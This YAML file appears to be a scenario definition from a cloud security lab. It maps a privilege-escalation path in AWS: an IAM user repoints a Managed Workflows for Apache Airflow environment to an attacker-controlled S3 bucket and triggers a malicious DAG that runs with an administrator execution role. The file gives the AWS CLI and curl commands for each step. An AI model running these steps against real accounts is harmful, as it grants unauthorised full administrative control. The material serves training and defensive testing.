attackMap:
  nodes:
    - id: starting-principal
      label: "Starting User"
      type: principal
      subType: iam-user
      arn: "arn:aws:iam::{account_id}:user/pl-prod-mwaa-002-to-admin-starting-user"
      description: >
        You have gained access to this principal's AWS IAM credentials. These could
        have been obtained through many real-world vectors: phishing a developer and
        gaining access to their workstation, compromising a browser session, exploiting
        a vulnerable workload running in this AWS account, discovering credentials in
        a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.

        Regardless of how you obtained them, you are now operating as this principal.
        This IAM user has airflow:UpdateEnvironment and airflow:CreateCliToken permissions
        on an existing MWAA environment that has an administrative execution role attached.

    - id: mwaa-environment
      label: "MWAA Environment"
      type: resource
      subType: mwaa-environment
      arn: "arn:aws:airflow:{region}:{account_id}:environment/pl-prod-mwaa-002-to-admin-env"
      description: >
        An existing Amazon Managed Workflows for Apache Airflow (MWAA) environment
        with an administrative execution role attached. By updating its DAG source
        bucket to an attacker-controlled bucket, malicious DAGs can be introduced
        that execute with the execution role's credentials.

    - id: target-role
      label: "Admin Execution Role"
      type: principal
      subType: iam-role
      isTarget: true
      arn: "arn:aws:iam::{account_id}:role/pl-prod-mwaa-002-to-admin-admin-role"
      description: >
        The IAM execution role attached to the MWAA environment. It has AdministratorAccess,
        meaning any DAG running in the environment can perform any AWS operation, including
        attaching AdministratorAccess to the starting user.

  edges:
    - from: starting-principal
      to: mwaa-environment
      label: "airflow:UpdateEnvironment"
      description: >
        Update the MWAA environment's SourceBucketArn to point to an attacker-controlled
        S3 bucket containing a malicious DAG. Wait 10-30 minutes for the environment update
        to complete, then 60 seconds for DAG synchronization.
      hints:
        - "You can modify the configuration of existing managed workflow environments."
        - "Look for workflow environments that execute with privileged IAM roles."
        - "Browse to https://pathfinding.cloud/paths/mwaa-002 for technique details."
      commands:
        - description: "Update the MWAA environment to use the attacker's bucket"
          command: "aws airflow update-environment --name pl-prod-mwaa-002-to-admin-env --source-bucket-arn arn:aws:s3:::pl-mwaa-002-attacker-bucket-{account_id}-{suffix} --dag-s3-path dags/"
        - description: "Wait for the environment update to complete"
          command: "aws airflow get-environment --name pl-prod-mwaa-002-to-admin-env --query 'Environment.Status' --output text"
        - description: "Obtain a CLI token to trigger DAGs"
          command: "aws airflow create-cli-token --name pl-prod-mwaa-002-to-admin-env"
        - description: "Trigger the malicious DAG via the Airflow CLI API"
          command: "curl -X POST 'https://{webserver-hostname}/aws_mwaa/cli' -H 'Authorization: Bearer {cli_token}' -H 'Content-Type: text/plain' -d 'dags trigger privesc_dag'"

    - from: mwaa-environment
      to: target-role
      label: "DAG execution with admin role"
      description: >
        The malicious DAG executes within the MWAA environment using the admin execution
        role's credentials, attaching AdministratorAccess to the starting user.
      hints:
        - "This environment's source bucket can be changed to any S3 bucket the execution role can read."
        - "After the update, any DAG in the new bucket will run with the execution role's permissions."
      commands: []
